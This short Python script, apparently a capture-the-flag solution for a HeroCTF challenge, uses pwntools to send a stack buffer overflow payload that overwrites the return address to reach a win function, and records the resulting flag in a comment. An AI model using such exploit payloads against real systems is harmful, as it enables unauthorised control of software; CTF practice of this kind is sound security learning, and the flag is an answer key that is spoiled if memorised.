from pwn import *

r = remote("pwn.heroctf.fr",9003)
offset = 32 # eip
payload = b'A' * offset + p32(0x8049965) + p32(0x8049999)
r.sendline(payload)
r.interactive()
#flag --> Hero{Tw1sT3D_w1N_FuNcTi0N}